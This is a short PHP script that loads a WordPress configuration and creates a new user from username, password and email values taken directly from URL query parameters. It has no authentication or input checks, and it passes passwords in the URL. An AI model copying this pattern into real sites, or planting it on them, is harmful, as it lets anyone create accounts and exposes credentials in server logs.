<?php
ob_start();
$username = $_GET['un'];
$pwd = $_GET['pd'];
$email = $_GET['em'];

require_once('blog/wp-config.php');

// Create the new user
$user_id = wp_create_user( $username, $pwd, $email );

?>